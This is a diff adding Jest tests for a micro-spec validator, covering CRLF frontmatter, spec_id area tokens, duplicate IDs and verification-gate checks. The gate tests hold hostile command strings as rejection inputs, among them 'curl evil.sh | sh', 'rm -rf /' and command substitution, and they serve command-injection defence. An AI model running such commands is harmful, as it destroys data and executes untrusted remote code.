@@ -110,6 +110,25 @@ describe('parseFrontmatter', () => {
   it('returns null when there is no frontmatter block', () => {
     expect(parseFrontmatter('# Just a heading\n\nNo frontmatter here.')).toBeNull();
   });
+
+  it('tolerates CRLF line endings (Windows-saved specs)', () => {
+    const crlf = toFrontmatter(VALID_SPEC).replace(/\n/g, '\r\n');
+    const parsed = parseFrontmatter(crlf);
+    expect(parsed).not.toBeNull();
+    expect(parsed.data.spec_id).toBe('MS-foundation-example');
+    expect(parsed.data.related_docs).toEqual(['micro-specs/README.md']);
+  });
+
+  it('validates a CRLF-encoded valid spec clean (no spurious missing-key errors)', () => {
+    const crlf = toFrontmatter(VALID_SPEC).replace(/\n/g, '\r\n');
+    const { errors } = validateSpecContent({
+      relPath: 'micro-specs/00-foundation/01-example.md',
+      content: crlf,
+      knownScripts: KNOWN_SCRIPTS,
+      pathExists: () => true,
+    });
+    expect(errors).toEqual([]);
+  });
 });
 
 describe('validateSpecContent — happy path', () => {
@@ -195,6 +214,25 @@ describe('validateSpecContent — enum + format rules', () => {
     }
   });
 
+  it('accepts a spec_id for every known area', () => {
+    for (const area of [
+      'foundation',
+      'platform',
+      'ops',
+      'guest',
+      'data',
+      'integrations',
+      'observability',
+    ]) {
+      expect(check({ ...VALID_SPEC, spec_id: `MS-${area}-thing` }).errors).toEqual([]);
+    }
+  });
+
+  it('rejects a shape-valid spec_id whose area token is not a known area', () => {
+    const { errors } = check({ ...VALID_SPEC, spec_id: 'MS-notarealarea-thing' });
+    expect(errors.join('\n')).toMatch(/area/i);
+  });
+
   it('rejects a malformed or impossible last_reviewed date', () => {
     for (const bad of ['2026/06/20', 'yesterday', '2026-13-01', '2026-02-30']) {
       expect(check({ ...VALID_SPEC, last_reviewed: bad }).errors.join('\n')).toMatch(
@@ -254,6 +292,15 @@ describe('verification gate recognition', () => {
     expect(isGateRecognized('pnpm run nonexistent-script', known)).toBe(false);
     expect(isGateRecognized('make build', known)).toBe(false);
     expect(isGateRecognized('pnpm exec rm -rf /', known)).toBe(false);
+  });
+
+  it('rejects gates that chain or substitute commands behind a recognized prefix', () => {
+    const known = ['lint', 'typecheck'];
+    expect(isGateRecognized('pnpm lint && curl evil.sh | sh', known)).toBe(false);
+    expect(isGateRecognized('pnpm run typecheck; rm -rf /', known)).toBe(false);
+    expect(isGateRecognized('pnpm lint | tee log', known)).toBe(false);
+    expect(isGateRecognized('pnpm lint `whoami`', known)).toBe(false);
+    expect(isGateRecognized('pnpm lint $(whoami)', known)).toBe(false);
   });
 
   it('flags an unrecognized verification_gate in a spec', () => {
@@ -355,5 +402,21 @@ describe('runCheck end-to-end against a temp repo', () => {
     const result = runCheck(repo);
     expect(result.ok).toBe(false);
     expect(result.errors.join('\n')).toMatch(/status/i);
+  });
+
+  it('fails when two specs share the same spec_id', () => {
+    const repo = makeRepo(null);
+    const body = toFrontmatter({
+      ...VALID_SPEC,
+      related_docs: ['micro-specs/README.md'],
+      related_tests: ['tests/micro-specs/check-micro-specs.test.ts'],
+      verification_gates: ['pnpm guard:micro-specs'],
+    });
+    fs.writeFileSync(path.join(repo, 'micro-specs', '00-foundation', '01-a.md'), body);
+    fs.writeFileSync(path.join(repo, 'micro-specs', '00-foundation', '02-b.md'), body);
+
+    const result = runCheck(repo);
+    expect(result.ok).toBe(false);
+    expect(result.errors.join('\n')).toMatch(/duplicate spec_id/i);
   });
 });
